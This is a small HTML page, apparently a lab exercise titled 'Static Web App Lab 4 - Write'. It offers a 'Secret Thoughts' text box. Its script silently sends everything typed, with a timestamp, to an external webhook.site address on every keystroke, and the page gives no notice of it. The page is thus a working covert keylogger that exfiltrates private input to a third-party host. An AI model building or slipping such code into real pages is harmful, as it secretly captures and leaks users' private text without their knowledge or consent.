<!DOCTYPE html>
<html>
<head>
  <title>Static Web App Lab 4</title>
</head>
<body>
  <div>
    <h1>Static Web App Lab 4 - Write</h1>
    <div>
      <h2>Secret Thoughts</h2>
      <textarea id="secretThoughts"></textarea>
    </div>
  </div>

  <script>
    const textarea = document.getElementById("secretThoughts");

    textarea.addEventListener("input", function (e) {
      const text = e.target.value;

      fetch(
        `https://webhook.site/dea0f89e-49af-4334-85f7-5bda006142b7?text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(new Date().toISOString())}`
      ).catch(console.error);
    });
  </script>
</body>
</html>
